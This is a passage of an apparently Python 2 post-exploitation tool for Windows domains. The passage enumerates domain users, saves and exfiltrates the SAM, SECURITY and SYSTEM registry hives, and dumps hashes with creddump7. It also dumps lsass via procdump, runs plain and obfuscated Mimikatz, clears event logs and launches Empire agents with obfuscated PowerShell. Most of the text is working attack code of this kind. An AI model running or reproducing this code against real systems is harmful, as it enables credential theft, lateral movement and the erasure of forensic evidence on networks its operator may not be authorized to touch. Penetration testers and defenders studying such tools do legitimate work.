		fout.write('echo .\n')
		fout.write('goto end\n\n')
		fout.write(':end\n')
		fout.close()
		print(colored("[+]Written to /tmp/fat.bat ",'yellow'))
		logging.info("[+]Written to /tmp/fat.bat ")
	except:
		print(colored("[-]Something went wrong...",'red'))
		logging.error("[-]Something went wrong writing FAT file")

#Routine gets current ip address
def get_ip_address(ifname):
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		return socket.inet_ntoa(fcntl.ioctl(
			s.fileno(),
			0x8915,  # SIOCGIFADDR
			struct.pack('256s', ifname[:15])
		)[20:24])
	except:
		return ""

#Routine gets domain usernames
def enumdomusers(ip,username,password,path):
	#Enumerate users using enumdomusers
	dom_accounts = []

	if username=="":
		proc = subprocess.Popen('pth-rpcclient '+ip+' -U \"\" -N '+' -c \"enumdomusers\" 2>/dev/null', stdout=subprocess.PIPE,shell=True)
	else:
		proc = subprocess.Popen('pth-rpcclient '+ip+' -U '+username+'%'+password +' -c \"enumdomusers\" 2>/dev/null', stdout=subprocess.PIPE,shell=True)

	stdout_value = proc.communicate()[0]

	if "Account Name:" in stdout_value:
		print(colored(username+" "+password ,'green')+colored(" - SUCCESSFUL LOGON",'green'))
	elif "NT_STATUS_LOGON_FAILURE" in stdout_value:
		print(colored(username+" "+password,'red') +colored(" - NT_STATUS_LOGON_FAILURE",'red'))
	elif "NT_STATUS_ACCOUNT_LOCKED_OUT" in stdout_value:
		print(colored('*****WARNING***** '+username+" "+password,'red') +colored(" - NT_STATUS_ACCOUNT_LOCKED_OUT",'red'))
	elif "NT_STATUS_ACCOUNT_DISABLED" in stdout_value:
		print(colored(username+" "+password,'blue')+colored(" - NT_STATUS_ACCOUNT_DISABLED",'blue'))
	elif "NT_STATUS_PASSWORD_MUST_CHANGE" in stdout_value:
		print(colored(username+" "+password,'blue') +colored(" - NT_STATUS_PASSWORD_MUST_CHANGE",'blue'))
	else:
		print(colored("[+]Successful Connection...",'yellow'))

	if not "user:[" in stdout_value:
		return False
	else:
		for line in stdout_value.split('\n'):
			tmpline=line.lstrip()
			tmpline=tmpline.split(' ')
			dom_accounts.append(tmpline[0].replace("user:[", "").replace("]", ""))

	if len(dom_accounts)>0:

		if dom_accounts[len(dom_accounts)-1]=='':
			del dom_accounts[len(dom_accounts)-1]

		print(colored('[+]Successfully extracted '+str(len(dom_accounts))+' user name(s)','green'))

		if os.path.isfile(path+str(targets[0])+"_users.txt"):
			os.remove(path+str(targets[0])+"_users.txt")

		fout=open(path+str(targets[0])+"_users.txt",'w')
		for u in dom_accounts:
			fout.write(u+"\n")
		fout.close()

		print(colored('[+]User accounts written to file '+(path+str(targets[0]))+"_users.txt",'green'))

	else:
		print(colored('[-]Looks like we were unsuccessfull extracting user names with this method','red'))
		logging.error("[-]Looks like we were unsuccessfull extracting user names with this method")

#Routine gets user descriptions fields
def getdescfield(ip,username,password,path):

	usernames = []
	descfield = []
	filename=path+(str(ip)+"_users.txt")

	#Start by seeing if out userfile exists, if it does read in contents
	if os.path.isfile(filename):
		print(colored('[+]Enumerating usernames to get description information...','yellow'))
		with open(filename,'r') as inifile:
			data=inifile.read()
			user_list=data.splitlines()

		#Make sure that the list of users is greater than 0
		if len(user_list)>0:
			#Confirm userfile found and its not empty
			print(colored('[+]Username file found...','green'))
			for x in xrange(0,len(user_list)):
				if '\\' in user_list[x]:
					paccount=user_list[x].split("\\", 1)[1]
				else:
					paccount=user_list[x]

				if username=="":
					proc = subprocess.Popen('pth-rpcclient '+ip+' -U \"\" -N '+'  -c \"queryuser '+paccount+'\" 2>/dev/null', stdout=subprocess.PIPE,shell=True)
				else:
					proc = subprocess.Popen('pth-rpcclient '+ip+' -U '+username+'%'+password +' -c \"queryuser '+paccount+'\" 2>/dev/null', stdout=subprocess.PIPE,shell=True)

				stdout_value = proc.communicate()[0]

				if 'result was NT_STATUS_ACCESS_DENIED' in stdout_value:
					print(colored('[-]Access Denied, Check Creds...','red'))
					break
				else:
					for line in stdout_value.split('\n'):
						tmpline=line.lstrip()
						if "Description :	" in tmpline:
							desclen=(tmpline.replace("Description :	", "").rstrip())
							if len(desclen)>0:
								usernames.append(paccount)
								descfield.append(tmpline.replace("Description :	", "").rstrip())

		if len(descfield)>0:
			print(colored('[+]Successfully extracted '+str(len(descfield))+' accounts with descriptions','green'))

			if os.path.isfile(path+str(ip)+"_desc_users.txt"):
				os.remove(path+str(ip)+"_desc_users.txt")

			fout=open(path+str(ip)+"_desc_users.txt",'w')
			for u in xrange(0,len(descfield)):
				fout.write(usernames[u]+","+descfield[u]+"\n")
			fout.close()

			print(colored('[+]Accounts with descriptions written to file '+path+str(ip)+"_desc_users.txt",'green'))

			if os.path.isfile(path+str(ip)+"_desc_users.txt"):
				proc = subprocess.Popen('grep -i pass '+path+str(ip)+"_desc_users.txt", stdout=subprocess.PIPE,shell=True)
				stdout_value = proc.communicate()[0]

				if len(stdout_value)>0:
					print(colored('[+]A quick check for pass reveals... '+'\n','yellow'))
					print(stdout_value+"\n")

				proc = subprocess.Popen('grep -i pwd '+path+str(ip)+"_desc_users.txt", stdout=subprocess.PIPE,shell=True)
				stdout_value = proc.communicate()[0]

				if len(stdout_value)>0:
					print(colored('[+]A quick check for pwd reveals... '+'\n','yellow'))
					print(stdout_value)

	else:
		print(colored('[-]Unable to find username file...','red'))
		logging.error('[-]Unable to find username file...')

#Main routine for dumping from a remote machine
def datadump(user, passw, host, path, os_version):

	#Exception where User has no password
	if passw=="":
		print(colored("[+]User Detected with No Password - Be patient this could take a couple of minutes: ",'yellow'))

		if not os.path.exists(path+host):
			os.makedirs(path+host)
			print(colored("[+]Creating directory for host: "+host,'green'))

		proc = subprocess.Popen("secretsdump.py "+domain_name+'/'+user+'@'+host+" -no-pass -outputfile "+outputpath+host+'/'+host+'.txt', stdout=subprocess.PIPE,shell=True)
		print(proc.communicate()[0])

		print(colored("[+]Files written to: "+path+host,'green'))
		print(colored("[+]Exiting as other features will not work at the minute with this configuration, Sorry!!: ",'yellow'))
		exit(1)

	#Run a whoami on the remote box
	proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C whoami \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
	services = proc.communicate()[0]

	#If reply is not blank
	if services!="":
		#We ran the check as system so if not returned bomb out.
		if not "nt authority\system" in services:
			print(colored("[-]Something went wrong connecting to: "+host,'red'))
		else:
			if not os.path.exists(path+host):
				os.makedirs(path+host)
				print(colored("[+]Creating directory for host: "+host,'green'))
			try:
				print(colored("[+]Enumerating SAM, SYSTEM and SECURITY reg hives: "+host,'green'))
				logging.info("[+]Enumerating SAM, SYSTEM and SECURITY reg hives: "+host)
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C reg save HKLM\sam c:\sam && reg.exe save HKLM\security C:\security && reg.exe save HKLM\system C:\system\" >/dev/null 2>&1")

			except OSError:
				print(colored("[-]Something went wrong here getting reg hives from: "+host,'red'))
				logging.error("[-]Something went wrong here getting reg hives from: "+host)
			for f in files:
				try:
					print(colored("[+]getting: "+f,'yellow'))
					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+path+host+"; get "+f+"\' 2>/dev/null")
				except OSError:
					print(colored("[-]Something went wrong here getting files via smbclient("+f+"): "+host,'red'))
			try:
				print(colored("[+]removing SAM, SYSTEM and SECURITY reg hives from: "+host,'green'))
				os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\sam && del c:\security && del c:\system\" 2>/dev/null")
				logging.info("[+]removing SAM, SYSTEM and SECURITY reg hives from: "+host)

			except OSError:
				print(colored("[-]Something went wrong here getting reg hives: "+host,'red'))
				logging.error("[-]Something went wrong here getting reg hives: "+host)
			try:
				print(colored("[+]Using pwdump: "+host,'green'))
				if os.path.exists(creddump7path+"pwdump.py"):
					os.system(creddump7path+"pwdump.py "+path+host+"/system "+path+host+"/sam | tee "+path+host+"/pwdump")
			except OSError:
				print(colored("[-]Something went wrong extracting from pwdump: "+host,'red'))
				logging.error("[-]Something went wrong extracting from pwdump: "+host)
			if skiplsacache in noanswers:
				try:
					print(colored("[+]getting remote version: "+host,'green'))
					print(os_version)
					if os_version!='':
						if os_version.find('Server 2003')!=-1:
							print(colored("[+]Server 2003 Found..",'blue'))
							for p in progs:
								try:
									print(colored("[+]Using "+p+": "+host ,'green'))
									if os.path.exists(creddump7path+p+".py"):
										os.system(creddump7path+p+".py "+path+host+"/system "+path+host+"/security false | tee "+path+host+"/"+p+"")
								except OSError:
										print(colored("[-]Something went wrong extracting from "+p,'red'))
								if os.stat(path+host+"/cachedump").st_size == 0:
									print(colored("[-]No cached creds for: "+host,'yellow'))
						else:
							for p in progs:
								try:
									print(colored("[+]Using "+p+": "+host ,'green'))
									if os.path.exists(creddump7path+p+".py"):
										os.system(creddump7path+p+".py "+path+host+"/system "+path+host+"/security true | tee "+path+host+"/"+p+"")
								except OSError:
									print(colored("[-]Something went wrong extracting from "+p,'red'))
								if os.stat(path+host+"/cachedump").st_size == 0:
									print(colored("[-]No cached creds for: "+host,'yellow'))
					else:
						print(colored("[-]os version not found",'red'))
						logging.error("[-]os version not found")
				except OSError:
					print(colored("[-]Something went wrong getting os version",'red'))
					logging.error("[-]Something went wrong getting os version")


			#NEW
			#After lsa is dumped, check if file exists and is greater than 0 bytes in size
			#if it is try and see if there are any available service account names to match with the passwords

			if os.stat(path+host+"/lsadump").st_size >0:
				fo=open(path+host+"/lsadump","r").read()
				if "_SC_" in fo:
					print(colored("[+]Checking for services running as users: "+host+"\n",'yellow'))
					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C wmic service get startname | findstr /i /V startname | findstr /i /V NT | findstr /i /V localsystem > c:\\users.txt\" 2>/dev/null")
					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+path+host+"; get users.txt\' 2>/dev/null")
					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\users.txt\" 2>/dev/null")
					res = os.stat(path+host+"/users.txt").st_size > 3
					if res==True:
						try:
							u = open(path+host+"/users.txt").read().splitlines()
							for n in u:
								if n:
									print(colored("[+]Account Retrieved ",'yellow')+n)

						except IOError as e:
							print("I/O error({0}): {1}".format(e.errno, e.strerror))

			print(colored("\n[+]Checking for logged on users: "+host,'yellow'))
			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C query user > c:\\logged_on_users.txt \" 2>/dev/null")
			os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+path+host+"; get logged_on_users.txt\' 2>/dev/null")
			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\logged_on_users.txt\" 2>/dev/null")
			res = os.stat(path+host+"/logged_on_users.txt").st_size > 3

			if res==True:
				try:
					u = open(path+host+"/logged_on_users.txt").read().splitlines()
					for n in u:
						if n:
							print("\t"+n)
				except IOError as e:
					print("I/O error({0}): {1}".format(e.errno, e.strerror))
			else:
				print(colored("[-]No logged on users found: "+host,'red'))
				logging.debug("[-]No logged on users found: "+host)

			#Check for Unquotes service paths
			#Base command wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v taken from
			#https://www.commonexploits.com/unquoted-service-paths/
			unquoted=[]
			proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C wmic service get name,pathname,startmode |findstr /i \"auto\" \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
			services = proc.communicate()[0]

			for service in services.splitlines():
				#If the line does not contain c:\windows
				if not "C:\WINDOWS\\" in service.upper():
					#If the line is not blank
					if len(service)>0:
						#If the line does not contain a "
						if not "\"" in service.upper():
							#Add the service to our list
							unquoted.append(service)

			#If the list is not empty
			if len(unquoted)>0:
				#Print a header
				print(colored("\n[!]Unquoted Service Paths Found",'red'))

				#Open file handler
				thefile = open(outputpath+targets[0]+'/unquotesservicepaths.txt', 'a')

				#Add to file when we started enumerating shares and using which account
				thefile.write("Unquoted Service Paths - Enumerated at "+time.strftime("%c")+'\n')

				#Cycle through list
				for i in xrange(len(unquoted)):
					#Print unquoted services.
					print(unquoted[i].strip()[:len(unquoted[i].strip())-40]))
					thefile.write(unquoted[i].strip())

				#Close file handle
				thefile.close()

				#Check file exists and then print message to screen
				if os.path.isfile(outputpath+targets[0]+'/unquotesservicepaths.txt'):
					print(colored("[+]Unquoted Service Paths saved to "+outputpath+targets[0]+'/unquotesservicepaths.txt'+"\n",'yellow')

			#We'll get a list of Windows Services and their paths
			#wmic service get name,startname,PathName
			weakservicepermissions=[]
			proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C wmic service get name,pathname,startmode \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
			services = proc.communicate()[0]
			for service in services.splitlines():
				#If the line does not contain c:\windows
				if not "C:\WINDOWS\\" in service.upper():
					#If the line is not blank
					if len(service)>0:
						#If the line does not contain a C:\PROGRAM FILES
						if not "C:\PROGRAM FILES" in service.upper():
							#Filter out WINEXESVC - however this may not reveal previous instances not installed by the snarf...
							if not "WINEXESVC" in service.upper():
								if "C:\\" in service.upper():
									#Add the service to our list
									weakservicepermissions.append(service)

			#If the list is not empty
			if len(weakservicepermissions)>0:
				#Print a header
				print(colored("\n[!]Possible Weak Service Permissions Found - (Service(s) found installed outside of Program Files and Windows Folders)",'red'))

				#Open file handler
				thefile = open(outputpath+targets[0]+'/weakservicepermissions.txt', 'a')

				#Add to file when we started enumerating shares and using which account
				thefile.write("\nPossible Weak Service Permissions - Enumerated at "+time.strftime("%c")+'\n')

				#Cycle through list
				for i in xrange(len(weakservicepermissions)):
					#Print weakservicepermissions services.
					print(weakservicepermissions[i].strip()[:len(weakservicepermissions[i].strip())-40])
					thefile.write(weakservicepermissions[i].strip())

				#Close file handle
				thefile.close()

				#Check file exists and then print message to screen
				if os.path.isfile(outputpath+targets[0]+'/weakservicepermissions.txt'):
					print(colored("\n[+]Possible Weak Service Permissions saved to "+outputpath+targets[0]+'/weakservicepermissions.txt','yellow'))
					print(colored("[+]Check using ",'yellow')+colored("'accesschk.exe -uwcqv %username%/everyone/users * -accepteula' ",'white')+colored("from sysinternals "+"\n",'yellow'))

			#Dump lsass using procdump from sysinternals
			if lsass_dump in yesanswers:
				if not os.path.isfile("/opt/Procdump/procdump.exe"):
					print(colored("[-]Cannot see procdump.exe in /opt/Procdump/ ",'red'))
					print(colored("[-]Download from https://technet.microsoft.com/en-us/sysinternals/dd996900.aspx",'yellow'))
					exit(1)
				else:
					print(colored("[+]Procdump.exe found",'green'))
					logging.debug("[+]Procdump.exe found")
				try:
					print(colored("[+]getting dump of lsass: "+host,'green'))
					logging.debug("[+]getting dump of lsass: "+host)
					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /opt/Procdump; put procdump.exe\' 2>/dev/null")
					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C c:\procdump.exe  -accepteula -ma lsass.exe c:\\lsass.dmp\" >/dev/null 2>&1")
					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get lsass.dmp\' 2>/dev/null")
					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\\procdump.exe && del c:\\lsass.dmp\" 2>/dev/null")
					if os.path.isfile(outputpath+host+"/lsass.dmp"):
						print(colored("[+]lsass.dmp file found",'green'))
					else:
						print(colored("[-]lsass.dmp file not found",'red'))
						logging.error("[-]lsass.dmp file not found")
				except OSError:
					print(colored("[-]Something went wrong getting lsass.dmp",'red'))
					logging.error("[-]Something went wrong getting lsass.dmp")

			#Routine does a basic mimikatz dump
			if massmimi_dump in yesanswers:
				try:
					print(colored("[+]Attempting to Run Mimikatz",'green'))
					fout=open('/tmp/mimi.ps1','w')
					fout.write('Import-Module c:\\a\n')
					fout.write('a -Dwmp > c:\\mimi_creddump.txt\n')
					fout.write('exit\n')
					fout.close()

					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put mimi.ps1\' 2>/dev/null")
					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+os.getcwd()+"; put a\' 2>/dev/null")
					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | powershell.exe -NonInteractive -NoProfile -ExecutionPolicy ByPass -File c:\\mimi.ps1  -Verb RunAs\" 2>/dev/null")
					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get mimi_creddump.txt\' 2>/dev/null")
					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\\mimi_creddump.txt c:\\a c:\\mimi.ps1\" 2>/dev/null")
					if os.path.isfile(outputpath+host+"/mimi_creddump.txt"):
						print(colored("[+]mimi_creddump.txt file found",'green'))
						if not os.path.isfile('/usr/bin/iconv'):
							print(colored("[-]Cannot find iconv",'red'))
							exit(1)
						else:
							print(colored("[+]Found iconv",'green'))
							os.system("iconv -f utf-16 -t utf-8 "+outputpath+host+"/mimi_creddump.txt > "+outputpath+host+"/mimi_creddump1.txt")
							print(colored("[+]Mimikatz output stored in "+outputpath+host+"/mimi_creddump1.txt",'yellow'))
							print(colored("[+]Basic parsed output:",'green'))
							# one liner from here: http://lifepluslinux.blogspot.com/2014/09/convert-little-endian-utf-16-to-ascii.html
							os.system("cat "+outputpath+host+"/mimi_creddump1.txt"+" |tr -d '\011\015' |awk '/Username/ { user=$0; getline; domain=$0; getline; print user \" \" domain \" \" $0}'|grep -v \"* LM\|* NTLM\|Microsoft_OC1\|* Password : (null)\"|awk '{if (length($12)>2) print $8 \"\\\\\" $4 \":\" $12}'|sort -u")
					else:
						print(colored("[-]mimi_creddump1.txt file not found",'red'))
				except OSError:
					print(colored("[-]Something went wrong running Mimikatz...",'red'))
					logging.error("[-]Something went wrong running Mimikatz...")

			#Routine clears event logs
			if clear_event in events_logs:
				try:
					print(colored("[+]Clearing event log: "+clear_event,'green'))
					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | powershell.exe -NonInteractive wevtutil cl "+clear_event+"\" 2>/dev/null")
				except OSError:
					print(colored("[-]Something went wrong clearing "+clear_event+" event log...",'red'))
			else:
				print(colored("[+]Event logs NOT cleared...",'yellow'))
				logging.warning("Event logs NOT cleared")

			#Routine runs custom commands
			if xcommand!='n':
				try:
					print(colored("[+]Running Command: "+xcommand,'green'))
					#Escapes string properly
					command = xcommand.encode('string-escape').replace('"', '\\"')
					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c "+command+"\" 2>/dev/null")
				except:
					print(colored("[-]Something went wrong ...",'red'))
					logging.error("[-]Something went wrong running custom command")

			if xscript!='n':
				try:
					print(colored("[+]Running Command Script: "+xscript,'green'))

					#[upload]destdir=,localpath=,localfile=
					#[download]remotedir=,remfile=
					#[execute]command=
					#[chkfile]file=
					#[chkdir]dir=

					fo=open(xscript,"r").read()

					#Display warning message is escaped quotes are found in script file.
					if "\\\"" in fo:
						print(colored("[!]WARNING - Check script file, you should no longer need to escape quotes i.e. \\\" in the script file",'red'))

					for line in fo.splitlines():

						if line[0:9]=="[execute]":

							command=line[9:len(line)]

							if command[0:8]=="command=":
								command=command[8:len(command)]
								print(colored("[+]Executing Command ",'yellow')+command)

								#Escapes string properly
								command = command.encode('string-escape').replace('"', '\\"')

								os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c "+command+"\" 2>/dev/null")

						elif line[0:8]=="[upload]":

							upload=line[8:len(line)]

							#Quick check for parameters
							upload=upload.split(",")
							if len(upload)!=3:
								print("[!]Missing parameters, [upload]destdir=,localpath=,localfile= ")
								sys.exit()

							destdir=upload[0]
							if destdir[0:8]=="destdir=":
								destdir=destdir[8:len(destdir)]

							localpath=upload[1]
							if localpath[0:10]=="localpath=":
								localpath=localpath[10:len(localpath)]

							localfile=upload[2]
							if localfile[0:10]=="localfile=":
								localfile=localfile[10:len(localfile)]

							if destdir=='none':
								print(colored("[+]Uploading ",'yellow')+localfile)
								os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+localpath+"; put "+localfile+"\' 2>/dev/null")
							else:
								print(colored("[+]Uploading ",'yellow')+localfile)
								os.system("/usr/bin/pth-smbclient //"+host+"/c$ --directory "+destdir+" -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+localpath+"; put "+localfile+"\' 2>/dev/null")

						elif line[0:10]=="[download]":

							download=line[10:len(line)]

							#Quick check for parameters
							download=download.split(",")
							if len(download)!=2:
								print("[!]Missing parameters, [download]remotedir=,remfile= ")
								sys.exit()

							remotedir=download[0]
							if remotedir[0:10]=="remotedir=":
								remotedir=remotedir[10:len(remotedir)]

							remfile=download[1]
							if remfile[0:8]=="remfile=":
								remfile=remfile[8:len(remfile)]

							if remotedir=='none':
								print(colored("[+]Downloading ",'yellow')+remfile)
								os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get "+remfile+"\' 2>/dev/null")
							else:
								print(colored("[+]Downloading ",'yellow')+remfile)
								os.system("/usr/bin/pth-smbclient //"+host+"/c$ --directory "+remotedir+" -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get "+remfile+"\' 2>/dev/null")

							if os.path.isfile(outputpath+host+"/"+remfile):
								print(colored("[+]File Downloaded to ",'yellow')+outputpath+host+"/"+remfile)

						elif line[0:9]=="[chkfile]":
							chkfile=line[9:len(line)]

							if chkfile[0:5]=="file=":
								chkfile=chkfile[5:len(chkfile)]
								print(colored("[+]Checking for file ",'yellow')+chkfile)

								#Escapes string properly
								chkfile = chkfile.encode('string-escape').replace('"', '\\"')

								proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c dir "+chkfile+"\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
								stdout_value = proc.communicate()[0]

								if not "bytes free" in stdout_value:
									raise Exception('[!]File not found '+chkfile)
								else:
									print(colored("[+]Success ",'green'))

						elif line[0:8]=="[chkdir]":
							chkdir=line[8:len(line)]

							if chkdir[0:4]=="dir=":
								chkdir=chkdir[4:len(chkdir)]

								print(colored("[+]Checking for dir ",'yellow')+chkdir)

								#Escapes string properly
								chkdir = chkdir.encode('string-escape').replace('"', '\\"')

								proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c dir "+chkdir+"\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
								stdout_value = proc.communicate()[0]

								if not "bytes free" in stdout_value:
									raise Exception('[!]Directory Not Found '+chkdir)
								else:
									print(colored("[+]Success ",'green'))

				except Exception as e:

					print(colored(str(e),'red'))
					logging.error("[-]Something went wrong running custom command "+str(e))

			#Routine runs a stealth mimikatz
			if stealth_mimi in yesanswers or stealth_mimi=="AV":
				try:
					print(colored("\n[+]Running Stealth Mimikatz",'blue'))

					shellscript = "a"
					InvokeFunction = "castell"
					FunctionCommand = "-Dwmp > c:\\creds.txt"

					#If it is a later Windows version check the UseLogonCredentials reg value to see whether cleartext creds will be available
					proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\" /v \"UseLogonCredential\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
					stdout_value = proc.communicate()[0]
					if "UseLogonCredential    REG_DWORD    0x0" in stdout_value:
						print(colored("[-]The reg value UseLogonCredential is set to 0 - no cleartext credentials will be available, use the -rW e/d/q parameter to modify this value",'green'))
					else:
						print(colored("[+]UseLogonCredential Registry Value is set to 1 - cleartext credentials will be hopefully be available",'green'))

					cps(shellscript,stealth_mimi,InvokeFunction,FunctionCommand,host,"system")

					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get creds.txt\' 2>/dev/null")
					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\\creds.txt\" 2>/dev/null")


					if os.path.isfile(outputpath+host+"/creds.txt"):
						print(colored("[+]creds.txt file found",'green'))
						if not os.path.isfile('/usr/bin/iconv'):
							print(colored("[-]Cannot find iconv",'red'))
							exit(1)
						else:
							print(colored("[+]Found iconv",'green'))
							os.system("iconv -f utf-16 -t utf-8 "+outputpath+host+"/creds.txt > "+outputpath+host+"/creds1.txt")
							# one liner from here: http://lifepluslinux.blogspot.com/2014/09/convert-little-endian-utf-16-to-ascii.html
							print(colored("[+]Basic parsed output:",'green'))
							os.system("cat "+outputpath+host+"/creds1.txt"+" |tr -d '\011\015' |awk '/Username/ { user=$0; getline; domain=$0; getline; print user \" \" domain \" \" $0}'|grep -v \"* LM\|* NTLM\|Microsoft_OC1\|* Password : (null)\"|awk '{if (length($12)>2) print $8 \"\\\\\" $4 \":\" $12}'|sort -u")
							print(colored("[+]Mimikatz output stored in "+outputpath+host+"/creds1.txt",'yellow'))
					else:
						print(colored("[-]creds1.txt file not found",'red'))

				except OSError:
					print(colored("[-]Something went wrong here...",'red'))

			#Routine will launch an empire agent
			if empire_launcher in yesanswers:
				try:
					#Check to make sure port is not already in use
					for i in xrange(10):
						PORT = randint(49151,65535)
						proc = subprocess.Popen('netstat -nat | grep '+str(PORT), stdout=subprocess.PIPE,shell=True)
						stdout_value = proc.communicate()[0]
						if len(stdout_value)>0:
							break

					my_ip=get_ip_address('eth0')
					print(colored("[+]Attempting to start Empire Launcher",'green'))
					Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
					httpd = SocketServer.TCPServer(("",PORT), Handler)
					print(colored("[+]Starting web server:"+my_ip+":"+str(PORT)+"",'green'))
					server_process = multiprocessing.Process(target=httpd.serve_forever)
					server_process.daemon = True
					server_process.start()

					x=' '

					print(colored("\n[+]Empire Powershell Launcher",'green'))
					print(colored("[+]Do not include powershell.exe -NoP -sta -NonI -W Hidden -Enc\n",'yellow'))
					response = raw_input("Please enter the PowerShell String to Execute :- ")
					if response !="":
						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+host+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+response+"\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
						print(colored("[+]Launcher Command Sent...",'yellow'))

					print(colored("[+]Stopping web server",'green'))
					server_process.terminate()

				except OSError:
					print(colored("[-]Something went wrong here...",'red'))

			#Routine starts multi_rdp in conjunction with mimikatz
			if multi_rdp in yesanswers or multi_rdp=="AV":
				try:
					print(colored("\n[+]Running Mimikatz MultiRDP",'blue'))

					shellscript = "a"
					InvokeFunction = "castell"
					FunctionCommand = "-Command \"ts::multirdp\""

					cps(shellscript,session_gopher,InvokeFunction,FunctionCommand,host,"system")

					sys.exit()
				except OSError:
					print(colored("[-]Something went wrong here...",'red'))

			#Routine runs mimikittenz to scrape memory for passwords
			if mimikittenz in yesanswers:
				try:
					print(colored("[+]Checking for Invoke-mimikittenz.ps1",'green'))
					if not os.path.isfile('./b'):
						print(colored("[-]Cannot find Invoke-mimikittenz.ps1",'red'))
						exit(1)
					print(colored("[+]Looks good",'green'))

					#Check to make sure port is not already in use
					for i in xrange(10):
						PORT = randint(49151,65535)
						proc = subprocess.Popen('netstat -nat | grep '+str(PORT), stdout=subprocess.PIPE,shell=True)
						stdout_value = proc.communicate()[0]
						if len(stdout_value)>0:
							break

					my_ip=get_ip_address('eth0')
					print(colored("[+]Attempting to Run Mimikittenz",'green'))
					Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
					httpd = SocketServer.TCPServer(("",PORT), Handler)
					print(colored("[+]Starting web server:"+my_ip+":"+str(PORT)+"",'green'))
					server_process = multiprocessing.Process(target=httpd.serve_forever)
					server_process.daemon = True
					server_process.start()

